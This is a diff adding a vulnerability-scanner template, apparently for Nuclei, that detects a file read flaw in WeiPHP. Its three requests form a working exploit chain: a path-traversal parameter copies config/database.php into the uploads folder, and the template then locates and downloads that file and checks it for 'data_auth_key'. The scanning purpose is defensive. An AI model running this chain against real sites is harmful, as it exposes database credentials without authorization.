@@ -1,0 +1,54 @@
+id: weiphp-readfile-vulnerability
+
+info:
+  name: WeiPHP ReadFile Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template detects a file read vulnerability in WeiPHP through multiple steps, verifying unauthorized access to sensitive files.
+
+http:
+  - id: r0
+    method: POST
+    path:
+      - "{{BaseURL}}/public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      "1":1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: r1
+    method: GET
+    path:
+      - "{{BaseURL}}/public/index.php/home/file/user_pics"
+    extractors:
+      - type: regex
+        name: img
+        group: 1
+        regex:
+          - '/public/uploads/picture/(?P<img>.+?)"'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: r2
+    method: GET
+    path:
+      - "{{BaseURL}}/public/uploads/picture/{{img}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "data_auth_key"
+          - "WeiPHP"
+        part: body
